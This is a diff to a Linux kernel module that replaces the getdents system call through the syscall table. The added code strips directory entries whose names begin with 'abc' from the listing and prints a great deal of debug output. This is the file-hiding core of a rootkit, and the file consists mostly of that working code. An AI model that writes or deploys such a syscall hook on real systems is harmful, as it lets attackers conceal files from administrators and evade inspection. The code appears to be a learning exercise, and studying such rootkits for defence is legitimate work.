@@ -11,6 +11,7 @@
 #include <linux/string.h>
 #include <linux/fs.h>
 #include <asm/special_insns.h>
+#include <linux/uaccess.h>
 
 #define PREFIX "abc"
 #define PREFIX_SIZE (sizeof(PREFIX) - 1)
@@ -19,7 +20,7 @@ struct dirent_{
 	unsigned long	d_ino;
 	unsigned long	d_off;
 	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
-	char		d_name[256]; // the struct value is actually longer than this, and d_name is variable width.
+	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
 };
 
 static unsigned long **p_sys_call_table;
@@ -40,26 +41,51 @@ asmlinkage int custom_getdents(unsigned int fd, struct dirent_ __user *entries, 
 	
 	char check[5] = "abc";
 	struct dirent_ *dEntryPtr;
-	dEntryPtr = entries;
-	int i;
+	//dEntryPtr = entries;
 	long bytes_read;
+
+	printk(KERN_ALERT "Count before: %d\n", count);
 	bytes_read = original_getdents(fd, entries, count);
-	
+
+	if(bytes_read <= 0) {
+		return 0;
+	}
+        	
+	printk(KERN_ALERT "Bytes read: %d\n", bytes_read);
 	char* dbuf;
 	dbuf = (char*) entries;
-	int boff;
+	int boff=0;
 	
+	printk(KERN_ALERT "%ld %ld %ld\n", (unsigned long) dbuf, (unsigned long)(dbuf + bytes_read), bytes_read);
+	
+
+	// read all loop
 	for(boff = 0; boff < bytes_read;){
 		dEntryPtr = (struct dirent_*) (dbuf + boff);
-		//if((strstr(dEntryPtr->d_name, check) != NULL)){
-			printk(KERN_ALERT "Count: %d\n", count);
-			printk(KERN_ALERT "File: %s\n", dEntryPtr->d_name);
-		//}
-		boff += dEntryPtr->d_reclen;
+		printk(KERN_ALERT "dbuf + boff %ld\n", (unsigned long)(dbuf+boff));
+		//printk(KERN_ALERT "Reclen: %d\n", dEntryPtr -> d_reclen);
+		//printk(KERN_ALERT "Size: %d\n", sizeof(*dEntryPtr)); 
+		printk(KERN_ALERT "File: %s\n", dEntryPtr->d_name);
+		printk(KERN_ALERT "reclen: %ld, sizeof struct %ld\n", (unsigned long)dEntryPtr->d_reclen, (unsigned long)sizeof(*dEntryPtr));
+		printk(KERN_ALERT "boff %ld < bytes read %ld\n", (unsigned long) boff, (unsigned long) bytes_read);
+		printk(KERN_ALERT "%ld %ld %ld\n",(unsigned long) dbuf + boff,(unsigned long) dbuf + boff + dEntryPtr->d_reclen, (unsigned long)bytes_read - (boff + dEntryPtr->d_reclen));
+		//if(strstr(dEntryPtr->d_name, check) != NULL) {	
+		if(strlen(dEntryPtr->d_name) >=3 && dEntryPtr->d_name[0]=='a' && dEntryPtr->d_name[1]=='b' && dEntryPtr->d_name[2] == 'c'){
+			copy_to_user(dbuf + boff, dbuf + boff + dEntryPtr -> d_reclen, bytes_read - (boff + dEntryPtr -> d_reclen));
+			bytes_read -= dEntryPtr->d_reclen;
+		}
+		else {
+			boff += dEntryPtr->d_reclen;
+		}
+		
+		printk(KERN_ALERT "Bytes read-loop: %d\n", bytes_read);
 	}
-	
+	printk(KERN_ALERT "Count: %d\n", count);
+		
+	printk(KERN_ALERT "Bytes read: %d\n", bytes_read);
 	// TODO: identify abc prefix entries, remove them from entries by shifting following entries and adjusting bytes read
 
+	printk(KERN_ALERT "~~~~~~~~~~~~~~~~~~~~~~~~~");
 	return bytes_read;	
 }
 
